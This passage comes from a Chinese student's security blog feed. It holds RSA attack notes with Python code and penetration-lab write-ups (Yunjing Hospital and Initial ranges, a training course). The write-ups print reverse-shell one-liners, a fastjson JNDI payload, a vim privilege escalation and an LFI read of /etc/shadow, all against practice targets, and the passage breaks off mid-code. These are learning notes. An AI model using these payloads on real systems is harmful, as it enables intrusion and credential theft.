(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    d_int = <span class="built_in">int</span>(d)</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d_int).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to factorize n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Boneh-Durfee-攻击"><a href="#Boneh-Durfee-攻击" class="headerlink" title="Boneh-Durfee 攻击"></a>Boneh-Durfee 攻击</h2><p>条件 <em>d</em>&lt;n^{0.292} </p><p>太复杂了先放这里😨</p><h2 id="公因子攻击"><a href="#公因子攻击" class="headerlink" title="公因子攻击"></a>公因子攻击</h2><p>如果两个不同的 RSA 公钥 n1&#x3D;p*q1，n2&#x3D;p*q2共用了一个素因子 p，我们可以通过求 GCD恢复 p，然后分解两个模数，从而恢复私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟两个共用素因子的 RSA 公钥</span></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q1 = getPrime(<span class="number">128</span>)</span><br><span class="line">q2 = getPrime(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">n1 = p * q1</span><br><span class="line">n2 = p * q2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别计算 c1 和 c2（加密相同明文也可以）</span></span><br><span class="line">m = <span class="string">b&quot;hello&quot;</span></span><br><span class="line">m_int = bytes_to_long(m)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m_int, e, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m_int, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击：找出公共素因子</span></span><br><span class="line">shared_p = gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> shared_p == p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解两个模数</span></span><br><span class="line">retrieved_q1 = n1 // shared_p</span><br><span class="line">retrieved_q2 = n2 // shared_p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原私钥 d1 和 d2</span></span><br><span class="line">phi1 = (shared_p - <span class="number">1</span>) * (retrieved_q1 - <span class="number">1</span>)</span><br><span class="line">phi2 = (shared_p - <span class="number">1</span>) * (retrieved_q2 - <span class="number">1</span>)</span><br><span class="line">d1 = inverse(e, phi1)</span><br><span class="line">d2 = inverse(e, phi2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">recovered_m1 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">recovered_m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered from n1:&quot;</span>, long_to_bytes(recovered_m1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered from n2:&quot;</span>, long_to_bytes(recovered_m2))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RSA-Padding-Oracle-攻击"><a href="#RSA-Padding-Oracle-攻击" class="headerlink" title="RSA Padding Oracle 攻击"></a>RSA Padding Oracle 攻击</h2><p>Padding Oracle 攻击是一种针对 RSA 使用 PKCS#1 v1.5 填充模式的侧信道攻击,在不获取私钥的情况下，通过服务端的错误反馈（如 “填充无效” 或 “解密失败”）逐步解密 RSA 密文或伪造签名</p><p>PKCS#1 v1.5 的加密填充格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 02 [至少 8 字节随机非零填充] 00 [明文数据]</span><br></pre></td></tr></table></figure><p>给定密文 c，攻击者构造新密文c′&#x3D;(s**{e}*c)modn，其中 s 是缩放因子。</p><p>解密后得到 m′&#x3D;s⋅m mod  n。</p><p>通过查询 Oracle 判断 m′ 的填充是否合法，可推断 m 的范围。</p><p>并没懂😶）</p><h2 id="私钥部分信息泄露攻击"><a href="#私钥部分信息泄露攻击" class="headerlink" title="私钥部分信息泄露攻击"></a>私钥部分信息泄露攻击</h2><p>在 RSA 的 CRT（中国剩余定理）优化模式中，私钥通常存储以下参数：</p><ul><li>p,q大素数，n&#x3D;p*q</li><li>dp&#x3D;d mod (p-1)</li><li>dq&#x3D;d mod (q-1)</li><li>qinv&#x3D;q^{-1} mod p（用于快速解密）</li></ul><p>已知dp和n，可以恢复p</p><p><img src="/2025/07/16/RSA%E5%8E%9F%E7%90%86/image-20250716223820730.png" alt="image-20250716223820730"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_p_from_dp</span>(<span class="params">e, n, dp</span>):</span><br><span class="line">    m = <span class="number">2</span>  <span class="comment"># 任意数（通常选小整数）</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m_p = <span class="built_in">pow</span>(c, dp, n)</span><br><span class="line">    p = gmpy2.gcd(m_p - m, n)</span><br><span class="line">    <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> p != n:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">123.</span>..  <span class="comment"># 模数</span></span><br><span class="line">dp = <span class="number">456.</span>..  <span class="comment"># 泄露的dp</span></span><br><span class="line">p = recover_p_from_dp(e, n, dp)</span><br><span class="line"><span class="keyword">if</span> p:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found p:&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found q:&quot;</span>, q)</span><br></pre></td></tr></table></figure><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://github.com/RsaCtfTool">RsaCtfTool</a> RSA自动化解密工具</p><p>参考 <a href="https://www.freebuf.com/articles/web/287854.html">https://www.freebuf.com/articles/web/287854.html</a></p><p>总结了一些rsa的攻击方式，题目好多，以后存一些板子</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云镜-hospital</title>
      <link href="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/"/>
      <url>/2025/07/13/%E4%BA%91%E9%95%9C-hospital/</url>
      
        <content type="html"><![CDATA[<p>终于打下了一个靶场，但是觉得自己的学习方式是不对的，一直在做但是没学到东西的感觉）</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/8.png" alt="屏幕截图 2025-07-13 105113"></p><p>参考wp,感谢大佬：</p><p><a href="https://blog.csdn.net/uuzeray/article/details/143355454">最保姆级的春秋云镜Hospital打靶笔记</a></p><p><a href="https://wz0beu.cn/%e4%ba%91%e9%95%9c-hospital/">Yuq1Ng的wp</a></p><p><a href="https://xz.aliyun.com/news/12906">先知社区</a></p><p>基本流程还是和Initial很像，又安装了很多工具啊</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>开启靶场之后，用fscan扫描漏洞</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/image-20250714213828881.png" alt="image-20250714213828881"></p><p>8080端口有Spring Boot Actuator heapdump信息泄露漏洞， 访问&#x2F;actuator&#x2F;heapdump下载到heapdump文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heapdump 文件（通常扩展名为 .hprof）是 Java 虚拟机（JVM）堆内存的快照文件，记录了某一时刻内存中存储的所有对象、类、线程等信息。它常用于 调试内存泄漏、分析应用运行状态、提取敏感信息。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br></pre></td></tr></table></figure><p>提取heapdump的敏感信息，得到了Shirokey,用shiro一把梭工具(这个工具需要用Java8运行)注入内存马，之后用蚁剑连接</p><p>无法读root目录</p><p>本地suid提权 <a href="https://blog.csdn.net/Fly_hps/article/details/80428173">介绍一下suid提权</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line"></span><br><span class="line">攻击者：nc -lvnp 2333</span><br><span class="line"></span><br><span class="line">靶机: bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>python反弹shell命令</p><p>web01: python3 -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip地址”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’</p><p>获取伪终端 python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>vim.basic提权读flag1 vim.basic &#x2F;root&#x2F;flag&#x2F;flag01.txt</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/1.png" alt="1"></p><p>提权到root &#x2F;usr&#x2F;bin&#x2F;vim.basic  -c ‘:python3 import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-pc”, “reset; exec sh -p”)’</p><p>一个很重要的技巧，拿到一台主机的shell后可以上传公钥用finalshell连接，方便传文件</p><p>上传fscan到web01,继续扫</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/2.png" alt="2"></p><p>172.30.12.6:8848有nacos，先frp内网穿透挂代理，nacos nacos登录</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/3.png" alt="3"></p><p>yaml反序列化</p><p>用Nacos漏洞综合利用工具生成恶意jar包(用java8打包)</p><p>因为172.30.12.6不出网，不能上传jar包，所以把yaml-payload.jar传到web01并开启http服务，NacosExploitGUI_v4.0利用漏洞</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/9.png" alt="9"></p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/image-20250714222026237.png" alt="image-20250714222026237"></p><p>修改文件新增一个用户并加入管理员组，远程桌面连接找到flag2</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/7.png" alt="7"></p><p>当时一直登录不成功，没明白原因</p><p>接下来是172.30.12.236，bp要挂代理才能抓包</p><p>username和password是json格式</p><p>jndi_tool工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 “bash -i &gt;&amp; /dev/tcp/172.30.12.5/9595 0&gt;&amp;1”</span><br><span class="line">使用jndi_tool.jar搭建一个恶意 RMI 服务器，当目标触发 JNDI 注入漏洞时，将会反弹一个 Shell 到攻击者的服务器，在web01上运行上面的命令，同时监听 nc -lvnp 9595</span><br></pre></td></tr></table></figure><p>同时用bp将json改为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://172.30.12.5:8888/Object&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>让服务器访问 <code>rmi://172.30.12.5:8888/Object</code>，并可能加载并执行远程恶意类，实现远程命令执行</p><p>成功反弹shell</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/4.png" alt="4"></p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/5.png" alt="5"></p><p>同样上传ssh公钥或者直接改密码，可以直接连接</p><p>上传fscan扫描， 172.30.54.12是最后一台机器</p><p>需要挂两层代理，proxifier设置代理链先写第一层再写第二层，成功了</p><p>把grafanaExp传到web03</p><p>.&#x2F;grafanaExp_linux_amd64 exp -u <a href="http://172.30.54.12:3000/">http://172.30.54.12:3000</a></p><p>得到postgres的密码Postgres@123，用navicat连接</p><p>接下来是数据库提权技术，我只能参照师傅们的wp操作，最后反弹shell</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/6.png" alt="6"></p><h1 id="技术和工具"><a href="#技术和工具" class="headerlink" title="技术和工具"></a>技术和工具</h1><p>Shiro反序列化 <a href="https://blog.csdn.net/Fighting_hawk/article/details/125562498">https://blog.csdn.net/Fighting_hawk/article/details/125562498</a></p><p>suid提权 <a href="https://blog.csdn.net/Fly_hps/article/details/80428173">https://blog.csdn.net/Fly_hps/article/details/80428173</a></p><p>Nacos Yaml反序列化 <a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a> </p><p>fastjson反序列化</p><p>数据库提权</p><p>要多想</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云镜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qax培训</title>
      <link href="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/"/>
      <url>/2025/07/08/qax%E5%9F%B9%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<p>七天的培训真的好累啊，第一天貌似在玩游戏，后面三天在打靶场，然后学了一天蓝队，最后一天讲了hvv和考试</p><p>学网安果然需要实战，打靶场的三天学到了很多东西</p><h1 id="Cyber-Fortress"><a href="#Cyber-Fortress" class="headerlink" title="Cyber Fortress"></a>Cyber Fortress</h1><p>1.靶机 172.16.12.97</p><p>端口扫描</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100411847.png" alt="image-20250708100411847"></p><p>80端口-http网页</p><p>3389端口-远程桌面</p><p>5985端口-Winrm远程管理</p><p>7001端口- 一些常见的应用服务器，比如WebLogic服务器和Tomcat服务器</p><p>Dirsearch目录扫描</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100436754.png" alt="image-20250708100436754"></p><p>访问扫出来的页面</p><p><a href="http://172.16.12.97/robots.txt">http://172.16.12.97/robots.txt</a></p><p>flag1</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250709231156645.png" alt="image-20250709231156645"></p><p><a href="http://172.16.12.97/api.php">http://172.16.12.97/api.php</a></p><p>flag2</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100505000.png" alt="image-20250708100505000"></p><p>扫描7001端口</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100540347.png" alt="image-20250708100540347"></p><p>打开<a href="http://172.16.12.97:7001/examples/">http://172.16.12.97:7001/examples/</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100625464.png" alt="image-20250708100625464"></p><p>发现是kindeditor编辑器</p><p>查看版本</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100648763.png" alt="image-20250708100648763"></p><p>搜索3.5.5版本的漏洞</p><p>目录遍历漏洞 </p><p>[<a href="https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/]">https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/]</a>(<a href="https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor">https://baizesec.github.io/bylibrary/漏洞库/02-编辑器漏洞/Kindeditor/KindEditor</a> 3.4.2%263.5.5列目录漏洞&#x2F;)</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100728472.png" alt="image-20250708100728472"></p><p>进入fastadmin&#x2F;public&#x2F;目录</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100818938.png" alt="image-20250708100818938"></p><p>发现flag文件，在80端口访问</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100836404.png" alt="image-20250708100836404"></p><p>同目录下发现WNeSOgakp.php</p><p>访问<a href="http://172.16.12.97/WNeSOgakp.php/index/login">http://172.16.12.97/WNeSOgakp.php/index/login</a></p><p>弱密码admin 123456登录后台</p><p>查看源代码，搜索到flag4</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps1.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708101949833.png" alt="image-20250708101949833"></p><p>搜索fastadmin后台漏洞，发现在线命令插件漏洞</p><p><a href="https://www.secpulse.com/archives/158403.html">https://www.secpulse.com/archives/158403.html</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps2.jpg" alt="img"> </p><p>成功植入一句话木马</p><p>用蚁剑连接</p><p>Flag5</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps3.jpg" alt="img"> </p><p>新建一个用户并添加到管理员组，远程桌面连接172.16.12.97</p><p>信息收集<img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps4.jpg" alt="img"></p><p>这台机器可以连接到10网段</p><p>Fscan扫描</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps5.jpg" alt="img"> </p><p>发现128~136有服务并且有ftp服务</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps6.jpg" alt="img"> </p><p>搜索发现W1R3S靶机渗透</p><p><a href="https://blog.csdn.net/Bossfrank/article/details/130953265">https://blog.csdn.net/Bossfrank/article/details/130953265</a></p><p>为了访问10网段的主机配置代理</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps7.jpg" alt="img"> </p><p>Dirb扫目录</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps8.jpg" alt="img"> </p><p>发现是cuppa cms框架</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps9.jpg" alt="img"> </p><p>到kali中的searchsploit找找有没有cuppa这个cms的漏洞</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps10.jpg" alt="img"> </p><p>查看25971.txt</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps11.jpg" alt="img"> </p><p>发现有文件包含漏洞</p><p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>用浏览器访问 </p><p><a href="http://10.10.10.135/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://10.10.10.135/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps12.jpg" alt="img"> </p><p>curl –data-urlencode urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow <a href="http://10.10.10.135/administrator/alerts/alertConfigField.php">http://10.10.10.135/administrator/alerts/alertConfigField.php</a></p><p>找到用户密码的hash</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps13.jpg" alt="img"> </p><p>用John密码爆破</p><p>用ssh连接主机</p><p>ssh <a href="mailto:w1r3s@10.10.10.134">w1r3s@10.10.10.134</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps14.jpg" alt="img"> </p><p>Root提权</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps15.jpg" alt="img"> </p><p>查看w1r3s主机ip</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps16.jpg" alt="img"> </p><p>发现这个主机可以连接9网段</p><p>在&#x2F;var&#x2F;www&#x2F;html前端文件夹中写入一句话木马文件shell.php，使用蚁剑连接</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps17.jpg" alt="img"> </p><p>上传stoaway的linux端的agent程序，运行回环连接到靶机1</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps18.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps19.jpg" alt="img"> </p><p>proxifier中配置代理链</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps20.jpg" alt="img"> </p><p>主机访问9网段的靶机3</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps21.jpg" alt="img"> </p><p>扫描发现robots.txt，其中有flag文件</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps22.jpg" alt="img"></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps23.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps24.jpg" alt="img"> </p><p>还发现了一个登录界面，robots.txt中有字典，进行爆破，登录</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps25.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps26.jpg" alt="img"> </p><p>我们只进入到第二层，在建立多层代理花费了很多时间</p><p><a href="https://www.freebuf.com/sectool/359841.html">stoaway建立多层代理</a></p><p>还是学到了很多东西的</p><h1 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h1><p><a href="https://blog.csdn.net/qq_59468567/article/details/138090062">awd总结</a></p><p>打包 tar -cvf web.tar &#x2F;var&#x2F;www&#x2F;html</p><p>解压 tar -xvf web.tar -c &#x2F;var&#x2F;www&#x2F;html</p><h2 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h2><p>包括比赛开始时修复漏洞，加固和应急响应</p><p>先将web目录打包拖下来用D盾扫描，删除恶意文件，用finialshell管理靶机很方便</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>日志分析 文件分析 进程分析，windows系统和linux系统是有差别的</p><p>部署蜜罐hfish</p><p><a href="https://hfish.net/#/2-2-linux">https://hfish.net/#/2-2-linux</a></p><p>默认安装在&#x2F;opt目录下</p><p>新增节点要在&#x2F;opt&#x2F;hfish下运行命令</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这几天真的很累啊，虽然最后的考试确实很简单，不过还是有很多东西需要花时间再学的，放假回家一直在睡😫，振作起来啊，打靶场很费力气但真的很好玩</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云镜-Initial</title>
      <link href="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/"/>
      <url>/2025/06/13/%E4%BA%91%E9%95%9C-Initial/</url>
      
        <content type="html"><![CDATA[<p>第一次打靶场，第一次接触内网渗透，做的过程中看了很多大佬的wp，感谢:）</p><p><a href="https://blog.csdn.net/uuzeray/article/details/141316323">https://blog.csdn.net/uuzeray/article/details/141316323</a></p><p><a href="https://xz.aliyun.com/news/11561">https://xz.aliyun.com/news/11561</a></p><p><a href="https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html">https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html</a></p><p><a href="https://wz0beu.cn/%e4%ba%91%e9%95%9c-initial/">https://wz0beu.cn/%e4%ba%91%e9%95%9c-initial/</a></p><p>2025.6.29 终于内网穿透成功了，打靶场成功</p><p>这真的是一件很酷的事情，我大概都只是照着师傅的wp在重复，要多学些东西才行呀</p><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><p>用fscan扫描靶场ip,有thinkphp5.0.23RCE,用工具一把梭</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/6.png" alt="6"></p><p>添加了一个webshell,可以用蚁剑连接</p><p>读&#x2F;root目录要提权</p><p><a href="https://www.huangmj.com/17116743651246.html#36-sudo-mysql">linux sudo提权方法</a></p><p>mysql的sudo提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">sudo mysql -e &#x27;\! find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/1.png" alt="1"></p><p>拿到了第一个flag</p><p>上传fscan扫描一下</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/2.png" alt="2"></p><p>172.22.1.2是域控，172.22.1.18有web服务，172.22.1.21有永恒之蓝</p><p>用内网穿透访问内网，我用的0.44的frp,因为不会写frpc.toml</p><p>附内网穿透教程😀</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.jpg" alt="内网穿透"></p><p>测试访问平台172.22.1.18</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/3.png" alt="3"></p><p>后台rce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 